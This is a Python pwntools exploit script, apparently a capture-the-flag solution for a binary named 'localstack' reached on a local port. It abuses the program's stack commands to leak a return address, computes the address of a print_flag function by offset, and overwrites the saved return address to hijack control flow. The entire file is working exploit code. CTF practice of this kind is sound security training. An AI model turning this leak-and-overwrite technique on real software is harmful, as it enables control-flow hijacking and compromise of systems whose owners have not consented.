#!/usr/bin/env python3

from pwn import *

exe = ELF("./localstack")

context.binary = exe

def main():
    #r = process("./localstack")
    r = remote("0.0.0.0","11100")

    r.sendlineafter(">> ",b"pop") # top
    r.sendlineafter(">> ",b"pop") # value
    r.sendlineafter(">> ",b"pop") # main + 363

    main_363 = int(r.recvline().decode().split(" ")[1])
    log.success(f"leak main+363 address : {hex(main_363)}")

    print_flag = main_363 - 534 # main & print_flag offset
    log.success(f"print_flag address : {hex(print_flag)}")

    r.sendlineafter(">> ",b"push 1")
    r.sendlineafter(">> ",b"push 64")
    r.sendlineafter(">> ",b"push 30") # set top to ret
    log.success(f"{r.recvline().decode()}")
    r.sendlineafter(">> ",b"push " + str(print_flag).encode())
    r.sendlineafter(">> ",b"exit")
    #pause()

    r.interactive()


if __name__ == "__main__":
    main()
